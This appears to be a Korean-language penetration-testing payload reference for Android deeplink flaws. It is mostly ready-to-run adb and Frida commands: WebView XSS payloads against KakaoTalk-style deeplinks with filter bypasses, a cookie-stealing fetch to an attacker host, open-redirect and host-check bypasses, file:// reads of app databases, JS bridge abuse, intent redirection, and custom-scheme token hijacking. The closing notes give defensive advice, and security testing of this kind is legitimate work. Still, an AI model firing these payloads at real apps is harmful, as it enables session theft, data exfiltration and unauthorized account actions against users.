### 정찰 페이로드

#### Manifest 정적 분석 (APK / source repo)

```bash
# AndroidManifest.xml 추출 (APK 환경)
apktool d -f -s target.apk -o /tmp/target_apk
cat /tmp/target_apk/AndroidManifest.xml

# deeplink 진입점 enumeration
grep -nE 'android:scheme="[^"]+"|android:host="[^"]+"|android:autoVerify|android:exported|android:permission' /tmp/target_apk/AndroidManifest.xml

# exported activity + intent-filter 조합
xmllint --xpath '//activity[@android:exported="true"]/intent-filter' AndroidManifest.xml
```

#### adb로 노출 component 조회

```bash
# 설치된 패키지의 component dump
adb shell dumpsys package <com.target.app> | grep -E 'Activity|filter'

# deeplink 받는 activity만
adb shell pm dump <com.target.app> | grep -A20 "Activity Resolver Table"
```

#### App Links assetlinks.json 확인

```bash
# autoVerify 대상 host의 assetlinks.json 존재 + 내용 검증
curl -s "https://<host>/.well-known/assetlinks.json" | jq .

# 존재 시 package_name + sha256_cert_fingerprints 일치 여부 확인
keytool -list -v -keystore release.keystore -alias <alias> | grep SHA256
```

#### Frida hook으로 동적 catch

```javascript
// deeplink 수신 시 URI 로깅
Java.perform(() => {
  const Intent = Java.use("android.content.Intent");
  Intent.getData.implementation = function() {
    const uri = this.getData();
    console.log("[DEEPLINK]", uri ? uri.toString() : "null");
    return uri;
  };
});
```

---

### 기본 페이로드

#### `WEBVIEW_XSS`

기본 (`url=javascript:` 직접):
```bash
# 카카오톡 같은 host별 WebView 진입점
adb shell am start -W -a android.intent.action.VIEW \
  -d "kakaotalk://adwebview/reward?url=javascript:alert('XSS')"

# App Links 환경
adb shell am start -W -a android.intent.action.VIEW \
  -d 'https://example.com/app/web?url=javascript:alert(document.domain)' \
  <com.target.app>

# 임의 외부 페이지 로드 (open redirect/phishing 변형)
adb shell am start -W -a android.intent.action.VIEW \
  -d 'kakaotalk://adwebview/reward?url=https://attacker.com/phish.html'

# loadDataWithBaseURL baseUrl 위장 (origin 위장 → cookie 탈취)
adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://render?html=<script>fetch("//attacker/?c="+document.cookie)</script>&base=https://victim.com'
```

스킴 차단 우회 (대소문자/공백/인코딩):
```bash
# 대소문자 변형
-d "kakaotalk://adwebview/reward?url=JaVaScRiPt:alert(1)"
-d "kakaotalk://adwebview/reward?url=JAVASCRIPT:alert(1)"

# 선행 공백/탭/CR/LF (URL encoded)
-d "kakaotalk://adwebview/reward?url=%09javascript:alert(1)"   # TAB
-d "kakaotalk://adwebview/reward?url=%20javascript:alert(1)"   # space
-d "kakaotalk://adwebview/reward?url=%0Ajavascript:alert(1)"   # LF
-d "kakaotalk://adwebview/reward?url=%0Djavascript:alert(1)"   # CR

# 콜론 이후 공백/줄바꿈
-d "kakaotalk://adwebview/reward?url=javascript:%0aalert(1)"

# URL encoding (`:` → %3A)
-d "kakaotalk://adwebview/reward?url=javascript%3Aalert(1)"

# Double encoding
-d "kakaotalk://adwebview/reward?url=javascript%253Aalert(1)"

# 부분 인코딩 (`j` → %6A)
-d "kakaotalk://adwebview/reward?url=%6Aavascript:alert(1)"

# Unicode escape
-d "kakaotalk://adwebview/reward?url=\u006Aavascript:alert(1)"

# data: 스킴 (javascript: 차단되어도 우회)
-d "kakaotalk://adwebview/reward?url=data:text/html,<script>alert(1)</script>"
-d "kakaotalk://adwebview/reward?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="

# vbscript:, livescript: (구버전 브라우저 — Android WebView 일부 환경)
-d "kakaotalk://adwebview/reward?url=vbscript:msgbox(1)"

# Chained redirect — http(s) 화이트리스트 통과 후 attacker 페이지에서 location='javascript:...'
-d "kakaotalk://adwebview/reward?url=https://attacker.com/redir-to-js.html"
```

shouldOverrideUrlLoading 누락 환경 — WebView 안에서 추가 URL 자동 로드:
```bash
# attacker page에서 location.href = "javascript:..." 또는 "file:///..." 로 nested redirect
-d "kakaotalk://adwebview/reward?url=https://attacker.com/nested-xss.html"
# nested-xss.html 내부:
# <script>setTimeout(()=>location='javascript:alert(document.cookie)',500)</script>
```

| 응답 | 판정 |
|---|---|
| WebView에서 alert / cookie 탈취 / DOM 조작 확인 | 확인됨 |
| 정상 도메인 외 임의 URL 로드 성공 (open redirect 변형) | 확인됨 (`OPEN_REDIRECT` 동시) |
| `url=javascript:` 차단되었으나 인코딩/대소문자/data: 변형 통과 | 확인됨 (블랙리스트 우회) |
| WebView가 about:blank, 화이트리스트 도메인으로 redirect, 차단 | 안전 |

#### `OPEN_REDIRECT`

```bash
# deeplink param이 외부 URL navigate에 사용
adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://open?redirect=https://attacker.com'

adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://login?next=//attacker.com'

adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://goto?url=https%3A%2F%2Fattacker.com'

# 정상 도메인 redirect (단순 URL 임의 로드 검증)
adb shell am start -W -a android.intent.action.VIEW \
  -d "kakaotalk://adwebview/reward?url=https://www.naver.com/"
```

호스트 검증 우회:
```bash
# substring/endsWith 검증 우회
-d 'myapp://open?redirect=https://example.com.attacker.com'
-d 'myapp://open?redirect=https://attacker-example.com'
-d 'myapp://open?redirect=https://attackerexample.com'

# Userinfo 변형
-d 'myapp://open?redirect=https://example.com@attacker.com'
-d 'myapp://open?redirect=https://attacker.com#@example.com'

# 경로 우회
-d 'myapp://open?redirect=//attacker.com'
-d 'myapp://open?redirect=/\\attacker.com'
-d 'myapp://open?redirect=\\\\attacker.com'

# Scheme 누락 (browser auto-prefix)
-d 'myapp://open?redirect=attacker.com'
```

#### `INTENT_REDIRECT`

```bash
# Intent.parseUri로 임의 component 호출
adb shell am start -W -a android.intent.action.VIEW \
  -d 'intent://example.com/#Intent;scheme=https;package=com.victim;component=com.victim/.SettingsActivity;end'

# nested intent
adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://forward?next=intent%3A%23Intent%3Bcomponent%3Dcom.victim%2F.AdminActivity%3Bend'
```

#### `FILE_SCHEME_LFI`

```bash
# WebView가 file:// 스킴 처리
adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://web?url=file:///data/data/com.target.app/databases/users.db'

adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://web?url=file:///etc/hosts'

# AllowFileAccessFromFileURLs 활성 시 SOP 우회 → 다른 origin 데이터 추출
adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://web?url=file:///sdcard/Download/attacker.html'
# attacker.html 내부에서 fetch('file:///data/data/com.target/...')
```

#### `JS_BRIDGE_EXPOSURE`

```bash
# attacker controlled HTML 로드 후 노출된 interface 호출
# 1. JS Bridge 메서드 enumeration
adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://web?url=https://attacker.com/probe.html'
# probe.html: <script>for(k in window)console.log(k)</script>

# 2. 노출 메서드 활용 (예: Android.invoke('action', 'arg'))
# attacker.html: <script>Android.invoke('shell', 'id')</script>
```

#### `PATH_TRAVERSAL`

```bash
# deeplink param이 file path
adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://open?file=../../databases/users.db'

adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://download?path=%2Fdata%2Fdata%2Fcom.target%2Fshared_prefs%2Fauth.xml'
```

#### `AUTH_BYPASS`

```bash
# 로그아웃 상태에서 민감 화면 직접 진입
adb shell pm clear <com.target.app>  # 세션 초기화

adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://transfer?to=attacker&amount=1000'

adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://settings/password-change'

adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://account/delete'
```

#### `PENDING_INTENT_HIJACK`

```bash
# Mutable PendingIntent 변조 (다른 앱에서 base intent intent extras 변경 가능)
# Frida로 PendingIntent.send() 호출 시점 캡처
```

```javascript
Java.perform(() => {
  const PI = Java.use("android.app.PendingIntent");
  PI.send.overload('android.content.Context', 'int', 'android.content.Intent').implementation = function(c, code, fillIn) {
    console.log("[PI.send]", this.toString(), "fillIn:", fillIn ? fillIn.toUri(0) : "null");
    return this.send(c, code, fillIn);
  };
});
```

#### `NO_AUTOVERIFY` (custom scheme hijack)

```bash
# 동일 scheme 등록한 PoC 앱 설치 후 chooser 표시 여부 확인
# PoC 앱 manifest:
# <intent-filter>
#   <action android:name="android.intent.action.VIEW"/>
#   <category android:name="android.intent.category.BROWSABLE"/>
#   <data android:scheme="myapp"/>
# </intent-filter>

adb install poc-hijack.apk
adb shell am start -W -a android.intent.action.VIEW -d 'myapp://login?token=X'
# chooser 표시되면 사용자가 PoC 앱 선택 가능 → 토큰 탈취
```

#### `ASSETLINKS_MISCONFIG`

```bash
# autoVerify=true 선언했으나 assetlinks.json 부재/오설정
HOST="<deeplink host>"
PKG="<com.target.app>"

curl -sI "https://${HOST}/.well-known/assetlinks.json"
# 200이 아니면 verify 실패 → custom scheme과 동일하게 hijack 가능

# 내용 검증 (200일 때)
curl -s "https://${HOST}/.well-known/assetlinks.json" | jq -r ".[].target.package_name"
# 일치하지 않으면 verify 실패

# 단말 verify 상태 확인 (Android 12+)
adb shell pm get-app-links --user 0 ${PKG}
# state=verified 외 (none, denied)면 결함
```

#### `TASK_HIJACK` (Strandhogg)

```bash
# 1. taskAffinity가 다른 앱과 동일하면 hijack 가능
aapt dump xmltree target.apk AndroidManifest.xml | grep -E "taskAffinity|launchMode"

# 2. PoC: 동일 taskAffinity의 악성 앱이 백그라운드에서 동일 task 침투
# allowTaskReparenting=true + taskAffinity="com.target.app" 설정 PoC 앱 설치
```

#### `EXPORTED_DEEPLINK_NO_PERM`

```bash
# permission 없이 노출된 deeplink activity
adb shell am start -W -n <com.target.app>/.<TargetActivity>

# intent-filter 통한 implicit invocation
adb shell am start -W -a android.intent.action.VIEW \
  -d 'myapp://target' --ez extra_admin true
```

---

### 우회 페이로드

| 방어 | 우회 |
|---|---|
| `host == "example.com"` 정확 매칭 | 매칭 자체는 우회 어려움 — `Uri.parse` 후 다른 component 사용 시점 점검 |
| `host.endsWith("example.com")` | `evil-example.com`, `attackerexample.com` |
| `host.contains("example.com")` | `attacker.com/example.com` 같은 path 활용 |
| `scheme == "https"` 만 | `https://attacker.com/...` (host 미검증) |
| Path prefix `/safe` | `/safe/../../evil`, `/safe/.@evil` |
| 정규식 `^https://example\.com` | `https://example.com.evil.com` (`.` 메타) |
| URL 디코딩 후 검증 | Double encoding `%252e%252e%252f` |
| WebView allowlist | `loadDataWithBaseURL("https://victim.com", attackerHTML, ...)` baseUrl 위장 |
| `@JavascriptInterface` 어노테이션 적용 | private/inherited 메서드 reflection으로 호출 |
| `FLAG_IMMUTABLE` 적용 | base intent에 attacker가 원하는 destination 이미 포함 |
| autoVerify=true + assetlinks.json 배포 | 동일 host의 다른 path를 다른 앱이 등록 가능한지 검증 (path별 verify) |
| custom scheme 차단 + https만 사용 | `assetlinks.json` 내 다른 fingerprint가 attacker 인증서면 우회 |

#### 인코딩/Scheme 변형

```
myapp://path?x=payload                              (raw)
myapp%3A%2F%2Fpath%3Fx%3Dpayload                    (full URL encode — 일부 chooser 우회)
intent://example.com/#Intent;scheme=myapp;end       (intent scheme 캐스팅)
myapp:////path                                      (3개 이상 슬래시)
myapp:path?x=payload                                (slash 없이 — 일부 파서)
MYAPP://path                                        (대문자 scheme)
myapp://USER:PASS@host/path                         (userinfo 포함 — 일부 host 검증 우회)
```

---

### 참고사항

- **외부 진입 영향도**: deeplink는 카카오톡/문자메시지/이메일/웹페이지 링크 클릭만으로 트리거 — 사용자가 URL을 직접 입력할 필요 없음. phishing 메시지에 `kakaotalk://...?url=javascript:...` 한 줄만 넣어 보내면 클릭 한 번으로 발화 → 영향도 큼
- **host별 routing 분기 모두 점검**: `when(uri.host){"adwebview"->...; "open"->...}` 같은 dispatch 코드는 host 한 곳만 검증 누락이어도 전체 게이트 — Phase 1에서 모든 분기 cross-check 필수
- WebView XSS는 `url=javascript:`/`url=data:text/html,...`이 가장 흔한 형태 — 카카오톡 `kakaotalk://adwebview/reward?url=...` 같은 패턴이 다수 앱에 동일 구조로 존재
- 스킴 차단 시 **trim() + lowercase() + URL decode 후 검증**해야 안전 — 인코딩/대소문자 우회 다수
- App Links (autoVerify=true + https + assetlinks.json) 외 모든 custom scheme은 **본질적으로 hijack 가능** — 민감 화면에 custom scheme만 사용하면 후보
- assetlinks.json은 **모든 변형 host**에 배포 필요 — `example.com`, `www.example.com`, `m.example.com` 각각
- `pm get-app-links` (Android 12+)로 단말 verify 상태 확인 가능 — `verified` 외는 결함
- exported 명시 없는 activity가 `<intent-filter>` 보유 시 — Android 12 (API 31)+ 빌드는 manifest merger 에러, 그 이전은 자동 exported=true
- `Intent.parseUri(..., Intent.URI_INTENT_SCHEME)`은 **anti-pattern** — 임의 component 호출 게이트
- `loadDataWithBaseURL("https://victim.com", attackerHTML, ...)`는 **origin 위장** — CSP/SOP 우회 가능
- `setAllowFileAccessFromFileURLs(true)` + `setAllowUniversalAccessFromFileURLs(true)`는 file:// 환경에서 SOP 완전 무력화
- WebView `addJavascriptInterface(obj, "X")` + target SDK ≥ 17 + `@JavascriptInterface` 미적용 메서드는 호출 불가 (방어 작동) — 단 reflection 기반 추가 메서드 노출 점검 필요
- `PendingIntent.FLAG_IMMUTABLE` (API 23+)은 base intent 변조 차단 — 그러나 base intent 자체에 sensitive destination 있으면 무관
- `singleTask` + `taskAffinity` 미명시 + `allowTaskReparenting=true`는 Strandhogg 변형 — Android 11+ 일부 패치
- deeplink로 진입한 화면은 일반 navigation과 동일한 인증/세션 검증 적용 필수 — 단순히 `if (!isLoggedIn) finish()` 패턴 자주 누락
- `intent://...#Intent;...;end` 페이로드는 Chrome 등 브라우저가 자동 변환 — 외부 링크 클릭만으로 트리거
- 동적 검증은 sandbox APK + emulator 한정 — 운영 사용자 단말에 PoC 앱 설치 금지
- Android 11+ package visibility 제약으로 `Intent.parseUri` + `startActivity` 결과 다를 수 있음 — `<queries>` manifest 확인
- TWA (Trusted Web Activity)와 일반 deeplink 구분 — TWA는 Chrome Custom Tabs 경유라 SSRF 영향 다름
- WebView `WebViewClient.shouldOverrideUrlLoading` 반환값에 따라 deeplink 처리 — false 반환 시 모든 URL이 WebView 안에서 로드됨 (file://, javascript: 포함)
- Universal Links (iOS) 와 App Links (Android)는 별개 — 같은 host도 양쪽 모두 점검 필요
- ProGuard/R8 minify된 APK는 메서드명 obfuscated — `addJavascriptInterface` 같은 framework API는 그대로 보임
